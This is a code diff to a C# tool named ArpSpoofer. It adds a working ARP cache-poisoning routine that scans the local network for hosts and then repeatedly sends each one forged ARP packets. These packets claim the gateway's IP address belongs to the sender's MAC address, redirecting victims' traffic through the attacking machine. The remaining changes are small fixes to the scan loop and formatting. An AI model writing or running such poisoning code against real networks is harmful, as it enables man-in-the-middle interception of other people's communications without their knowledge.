@@ -22,22 +22,69 @@ namespace ArpSpoofer.Services
         public event EventHandler<double> ScanTick;
         public event EventHandler<IpMacPair> NewIpMacFound;
         public bool IsScanning { get; set; }
+        public bool IsPoisoning { get; set; }
         public ARPSpoofingService(DeviceWithDescription device)
         {
             Device = device;
             cancelTokenSource = new CancellationTokenSource();
             IsScanning = false;
+            IsPoisoning = false;
             _ipMacPairs = new Dictionary<string, string>();
         }
 
-        internal void StartPoisoning(string getawayIp)
+        internal async void StartPoisoning()
         {
+            IsPoisoning = true;
+            var routerMac = _ipMacPairs.Single(x => x.Value == Device.GatewayString).Key;
+            if (string.IsNullOrEmpty(routerMac))
+            {
+                throw new KeyNotFoundException(Device.GatewayString);
+            }
 
+            var communicator = Device.Device.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000);
+            MacAddress source = new MacAddress(routerMac.Replace('-', ':'));
+            EthernetLayer ethernetLayer = new EthernetLayer
+            {
+                //Source = source,
+                //Destination = destination,
+                EtherType = EthernetType.None
+            };
+            ArpLayer arpLayer = new ArpLayer
+            {
+                ProtocolType = EthernetType.IpV4
+            };
+            PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);
+            while (true)
+            {
+                if (IsPoisoning == false)
+                {
+                    break;
+                }
+                foreach (var kvp in _ipMacPairs)
+                {
+                    if (kvp.Value != Device.GatewayString)
+                    {
+                        ethernetLayer.Source = new MacAddress(Device.MacString.Replace('-', ':'));
+                        ethernetLayer.Destination = new MacAddress(kvp.Key.Replace('-', ':'));
+                        arpLayer.Operation = ArpOperation.Request;
+                        arpLayer.SenderHardwareAddress = Array.AsReadOnly(Device.MacByte);
+                        arpLayer.SenderProtocolAddress = Array.AsReadOnly(Device.GatewayString.Split('.').Select(str => byte.Parse(str)).ToArray());
+                        arpLayer.TargetHardwareAddress = Array.AsReadOnly(kvp.Key.Split('-').Select(str => Convert.ToByte(str, 16)).ToArray());
+                        arpLayer.TargetProtocolAddress = Array.AsReadOnly(kvp.Value.Split('.').Select(str => byte.Parse(str)).ToArray());
+                        
+                        Packet packet = builder.Build(DateTime.Now);
+                        communicator.SendPacket(packet);
+                        Thread.Sleep(2000);
+                        // Send down the packet
+                    }
+                }
+            }
+            communicator.Dispose();
         }
 
         internal void StopPoisoning()
         {
-
+            IsPoisoning = false;
         }
 
         internal void Scan()
@@ -53,7 +100,8 @@ namespace ArpSpoofer.Services
 
         internal void StopScan()
         {
-            if (IsScanning == true) { 
+            if (IsScanning == true)
+            {
                 cancelTokenSource.Cancel();
                 IsScanning = false;
             }
@@ -99,6 +147,10 @@ namespace ArpSpoofer.Services
             {
                 for (var i = 1; ; ++i)
                 {
+                    if (IsScanning == false)
+                    {
+                        break;
+                    }
                     if (i >= 256)
                     {
                         i = 1;
@@ -157,7 +209,8 @@ namespace ArpSpoofer.Services
                                         //_receivedPackets.Add(packet);
                                         string mac = BitConverter.ToString(packet.Ethernet.Arp.SenderHardwareAddress.ToArray());
                                         string ip = packet.Ethernet.Arp.SenderProtocolIpV4Address.ToString();
-                                        if(!_ipMacPairs.ContainsKey(mac)){
+                                        if (!_ipMacPairs.ContainsKey(mac))
+                                        {
                                             _ipMacPairs.Add(mac, ip);
                                             if (NewIpMacFound != null)
                                             {
